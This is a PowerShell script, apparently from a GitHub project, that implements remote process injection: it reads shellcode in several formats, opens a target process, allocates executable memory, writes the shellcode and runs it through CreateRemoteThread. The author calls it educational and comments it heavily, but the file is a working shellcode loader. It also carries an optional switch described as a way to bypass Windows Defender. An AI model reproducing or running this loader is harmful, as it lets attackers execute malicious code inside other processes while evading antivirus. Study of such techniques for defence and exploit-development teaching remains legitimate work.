function Remote-ProcessInject {
#.SYNOPSIS
# Standalone PowerShell Script for Remote Process Injection utilizing Add-Type
# Arbitary Version Number: v0.9.9
# Author: Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# Predominantly educational shellcode loader with overly verbose comments.  The idea is to be fairly
# modular, and documented to be an educational resource for those getting into exploit development.
# 
# Works with both Windows PowerShell and PowerShell Core (Pwsh), as well as 64-bit and 32-bit
# architectures -- just make sure you are running 32-bit PowerShell if your shellcode is 32-bit.
#
# As for shellcode, the `-Shellcode` parameter is intenionally undeclared and written to accept most 
# shellcode formats.  Currently supports strings [string] and byte arrays [byte[]].
#
# Supported String Formats:
#   > Path to Raw Shellcode   : .\shellcode.bin
#   > Python Shellcode Format : 'b"\x45\x78\x61\x6d\x70\x6c\x65"'
#   > C Shellcode Format      : '\x45\x78\x61\x6d\x70\x6c\x65'
#   > C++/C# Shellcode Format : '{0x45,0x78,0x61,0x70,0x6c,0x65}'
#
# Parameters:
#   -Shellcode  -->  Shellcode to execute; can be a byte array or string containing file path or bytes.
#   -TargetPID  -->  Target process PID to inject into. 
#   -Please     -->  Alternative execution method that will likely bypass Windows Defender.
#   -Help       -->  Return Get-Help information.
#
#.LINK
# https://github.com/tylerdotrar/ShellcodeLoaderPS

    Param(
        $Shellcode, # Intentionally vague type for maximum compatibility
        [int]   $TargetPID, 
        [switch]$Please, # Currently Broken, don't use
        [switch]$Debug,  # ADD ME PLEASE 
        [switch]$Help
    )


    # Return Get-Help information
    if ($Help) { return (Get-Help Remote-ProcessInject) }


    # Error Correction
    if (!$Shellcode) { return (Write-Host '[!] Error! Missing shellcode.' -ForegroundColor Red) }
    if (!$TargetPID) { return (Write-Host '[!] Error! Missing target process PID.' -ForegroundColor Red) }
    if (!(Get-Process -Id $TargetPID 2>$NULL)) { return (Write-Host "[!] Error! Unable to find process with PID of '${TargetPID}'." -ForegroundCOlor Red) }


    # Print data type
    Write-Host "[!] Detecting Data Type of Shellcode Parameter:" -ForegroundColor Yellow
    Write-Host " o  BaseType : $($Shellcode.GetType().BaseType)"
    Write-Host " o  Name     : $($Shellcode.GetType().Name)"

    
    # Supported String Formats:
    #   > Paths to raw files (e.g., ".\shellcode.bin")
    #   > Python : 'b"\x45\x78\x61\x6d\x70\x6c\x65"'
    #   > C      : '\x45\x78\x61\x6d\x70\x6c\x65'
    #   > C++/C# : '{0x45,0x78,0x61,0x70,0x6c,0x65}'
    
    if ($Shellcode -is [String]) {
            
        $Shellcode = $Shellcode.Replace("`n",'')

        # Check if $Shellcode is a path to a shellcode file
        if (Test-Path -LiteralPath $Shellcode) {
            
            Write-Host " o  Parameter is a path to a file."
            $ShellcodePath   = (Get-Item -LiteralPath $Shellcode).Fullname    
            $shellcodeBuffer = [System.IO.File]::ReadAllBytes($ShellcodePath)
            Write-Host " o  --> Path : $ShellcodePath"
        }

        # Format C/Python formatted shellcode string into PowerShell format
        elseif (($Shellcode -like 'b"\x*') -or ($Shellcode -like '\x*')) {

            Write-Host " o  Shellcode formatted for C or Python."
            Write-Host " o  --> Formatting for PowerShell..."

            # Convert to PowerShell ASCII array
            $Shellcode = $Shellcode.Replace(' ','')
            $psShellcode = ($Shellcode.Replace('b"','').Replace('"','')).Split('\')[1..$Shellcode.Length]

            # Convert Shellcode ASCII array to Byte Array
            $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_.Replace('x',''),16) })
        }

        # Format C++/C# formatted shellcode string into PowerShell format
        elseif ($Shellcode -like '{0x*') {

            Write-Host " o  Shellcode formatted for C++ or C#."
            Write-Host " o  --> Formatting for PowerShell..."

            # Convert to PowerShell ASCII array
            $Shellcode = $Shellcode.Replace(' ','')
            $psShellcode = ($Shellcode.Replace('{0x','').Replace('}','')) -Split ',0x'

            # Convert Shellcode ASCII array to Byte Array
            $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_,16) })
        }
        else { return (Write-Host '[!] Error! Unable to determine shellcode type.' -ForegroundColor Red) }
    }
    
    # Shellcode is already formatted as a byte array
    elseif ($Shellcode -is [Byte[]]) {

        Write-Host " o  Shellcode already formatted as a byte array."
        Write-Host " o  --> No formatting required."
        $shellcodeBuffer = $Shellcode
    }
    else { return (Write-Host '[!] Error! Unable to determine shellcode type.' -ForegroundColor Red) }
    

    # Load Win32 API Calls required for Execution
    Write-Host "[!] Loading Win32 API Calls..." -ForegroundColor Yellow -NoNewline

    Try {

        # Method 1: classic verbose method, but this will get blocked by Windows Defender
        if (!$Please) {
            $Win32Api = @'
using System;
using System.Runtime.InteropServices;

// Main Win32 API calls needed for shellcode execution
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref int lpThreadId);
}
'@
            Add-Type -TypeDefinition $Win32Api -PassThru
        }
        
        # Method 2: this goofy method doesn't seem to get caught by defender, but is very noisy
        else {
            Add-Type -Namespace Var1 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);'
            Add-Type -Namespace Var2 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory")] public static extern void CopyMemory(IntPtr dest, IntPtr src, uint size);'
            Add-Type -Namespace Var3 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);'
            Add-Type -Namespace Var4 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll")] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);'
        }
    }

    Catch { return (Write-Host "`n[!] Error! Failed to load API calls.`n o  (Note: This likely failed due to Windows Defender.)" -ForegroundColor Red) }


    # Enums / Constants / Flags for later API Calls 
    $State = @{
        MEM_COMMIT  = 0x00001000;
        MEM_RESERVE = 0x00002000;
    }

    $Protection = @{
        PAGE_EXECUTE_READWRITE = 0x40;
    }

    $Process = @{
        #PROCESS_ALL_ACCESS        = 0x000F0000 -bor 0x00100000 -bor 0xFFFF;     # 2097151
        PROCESS_ALL_ACCESS        = 0x001F0FFF; # Yoinked from invoke-shellcode  # 2035711
        PROCESS_CREATE_THREAD     = 0x0002;
        PROCESS_QUERY_INFORMATION = 0x0400;
        PROCESS_VM_OPERATION      = 0x0008;
        PROCESS_VM_READ           = 0x0010;
        PROCESS_VM_WRITE          = 0x0020;
    }


    # Initialize Key Variables
    $TargetProcess          = Get-Process -Id $TargetPID


    ### Acquire handle to the target process 

    # OpenHandle()
    # 
    # IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);
    #

    Write-Host "[!] Acquiring handle to '$($TargetProcess.ProcessName)' (${TargetPID})..." -ForegroundColor Yellow

    #$dwDesiredAccess = $Process.PROCESS_CREATE_THREAD -bor $Process.PROCESS_CREATE_THREAD -bor $Process.PROCESS_VM_OPERATION -bor $Process.PROCESS_VM_READ -bor $Process.PROCESS_VM_WRITE
    
    # OpenProcess() Args
    $dwDesiredAccess = $Process.PROCESS_ALL_ACCESS
    $bInheritHandle  = $FALSE
    $dwProcessId     = $TargetPID
    
    Try   { $TargetProcessHandle = [Win32]::OpenProcess($dwDesiredAccess, $bInheritedHandle, $dwProcessID)                      }
    Catch { return (Write-Host '[!] Error! Failed to acquire handle to target process via OpenProcess().' -ForegroundColor Red) }

    Write-Host ' o  ' -NoNewline ; Write-Host 'OpenProcess()' -ForegroundColor Green
    Write-Host " o  --> Target Process : $($TargetProcess.ProcessName)"
    Write-Host " o  --> Target PID     : $($TargetProcess.Id)"
    Write-host " o  --> Process Handle : ${TargetProcessHandle}"  


    # VirtualAllocEx()
    #
    #    Definition  >  Allocates space within an external process and returns a pointer to allocated space.
    #    Location    >  Kernel32.dll
    #    Reference   >  https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    #
    #  ----------          ------      ------------
    #   Argument            Type        Definition
    #  ----------          ------      ------------
    #  > hProcess          > [IntPtr]  > handle to the target process           (i.e., acquired from OpenProcess)
    #  > lpAddress         > [IntPtr]  > starting address in memory to allocate (if null, system dynamically determines where this is)
    #  > dwSize            > [Int]     > size of memory to allocate             (i.e., size of shellcode)
    #  > flAllocationType  > [Int]     > memory allocation flags                (i.e., MEM_COMMIT and MEM_RESERVE flags)
    #  > flProtect         > [Int]     > memory protection flags                (i.e., PAGE_EXECUTE_READWRITE flag)
    #
    # IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect);
    #

    Write-Host "[!] Allocating executable memory for shellcode in '$($TargetProcess.ProcessName)' ..." -ForegroundColor Yellow

    # VirtualAllocEx() Args
    $hProcess         = $TargetProcessHandle
    $lpAddress        = [IntPtr]::Zero 
    $dwSize           = $shellcodeBuffer.Length
    $flAllocationType = $State.MEM_COMMIT -bor $State.MEM_RESERVE
    $flProtect        = $Protection.PAGE_EXECUTE_READWRITE

    Try   { $shellAddress = [Win32]::VirtualAllocEx($hProcess, $lpAddress, $dwSize, $flAllocationType, $flProtect) }
    Catch { return (Write-Host '[!] Error! Failed to allocate memory via VirtualAllocEx().' -ForegroundColor Red)  }

    #Write-Host " o  VirtualAllocEx()"
    Write-Host ' o  ' -NoNewline ; Write-Host 'VirtualAllocEx()' -ForegroundColor Green
    Write-Host " o  --> Allocated Memory Address : ${shellAddress}"
    Write-Host " o  --> Memory Block Size        : ${dwSize} bytes"


    # WriteProcessMemory()
    #
    # bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);
    #
    # WriteProcessMemory(procHandle, init, buf, shellcode_size, ref bytesWritten);
    #

    Write-Host "[!] Writing shellcode to allocated memory..." -ForegroundColor Yellow

    # WriteProcessMemory() Arg
    $hProcess               = $TargetProcessHandle # Acquired from OpenProcess()
    $lpBaseAddress          = $shellAddress        # Acquired from VirtualAllocEx()
    $lpBuffer               = $shellcodeBuffer     # Acquire pointer to the $shellcodeBuffer variable contents ???
    $nSize                  = $shellcodeBuffer.Length
    $lpNumberOfBytesWritten = 0 # throwaway variable lol

    Try   { $MemoryCopied = [Win32]::WriteProcessMemory($hProcess, $lpBaseAddress, $lpBuffer, $nSize, [ref]$lpNumberOfBytesWritten)   }
    Catch { return (Write-Host '[!] Error! Failed to write shellcode via WriteProcessMemory().' -ForegroundColor Red) }

    #Write-Host ' o  WriteProcessMemory()'
    Write-Host ' o  ' -NoNewline ; Write-Host 'WriteProcessMemory()' -ForegroundColor Green
    Write-Host " o  --> Shellcode Buffer Copied : ${MemoryCopied}"


    ### Execute shellcode via a Remote Thread

    # CreateRemoteThread()
    #
    #    Definition  >  Create a thread to execute within the address space of the calling process.
    #    Location    >  Kernel32.dll
    #    Reference   >  https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
    #
    #  ----------            ------      ------------
    #   Argument              Type        Definition
    #  ----------            ------      ------------
    #  > hProcess            > [IntPtr]  > handle to the target process                              (i.e., acquired from OpenProcess())
    #  > lpThreadAttributes  > [IntPtr]  > pointer to SECURITY_ATTRIBUTES struct                     (i.e., no pointer means handle cannot be inherited)
    #  > dwStackSize         > [Int]     > initial size of the stack in bytes                        (i.e., 0 means the new thread uses the default size)
    #  > lpStartAddress      > [IntPtr]  > pointer to the memory address to be executed              (i.e., executable shellcode memory address)
    #  > lpParameter         > [IntPtr]  > pointer to a variable to be passed to the thread          (i.e., 0 means none)
    #  > dwCreationFlags     > [Int]     > creation flags of the thread                              (i.e., 0 means the thread runs immediately after creation)
    #  > lpThreadId          > [Int]     > pointer to a variable that receives the thread identifier (i.e., 0 points to the current process)

    # IntPtr threadPTR = CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadID);
    #  IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref int lpThreadId);


    Write-Host "[!] Executing shellcode..." -ForegroundColor Yellow

    # CreateRemoteProcess() Args
    $hProcess          = $TargetProcessHandle
    $lpThreadAtributes = [IntPtr]::Zero
    $dwStackSize       = 0
    $lpStartAddress    = $shellAddress
    $param             = [IntPtr]::Zero
    $dwCreationFlags   = 0
    $lpThreadId        = 0 # throwaway variable

    # $threadId = 0 

    Try {
        
        $thread = [Win32]::CreateRemoteThread($hProcess, $lpThreadAtributes, $dwStacksize, $lpStartAddress, $param, $dwCreationFlags, [ref]$lpThreadId)

        <#
        # CreateThread()
        if (!$Please) { $thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $shellAddr, [IntPtr]::Zero, 0, [ref]$threadId)    }
        else          { $thread = [Var3.Api]::CreateThread([IntPtr]::Zero, 0, $shellAddr, [IntPtr]::Zero, 0, [ref]$threadId) }
        #>

    }
    Catch { return (Write-Host '[!] Error! Failed to create thread via CreateRemoteThread().' -ForegroundColor Red)                    }
    
    #Write-Host " o  CreateRemoteThread()"
    Write-Host ' o  ' -NoNewline ; Write-Host 'CreateRemoteThread()' -ForegroundColor Green
    Write-Host " o  -->  Returned Shellcode Thread : ${thread}"
}
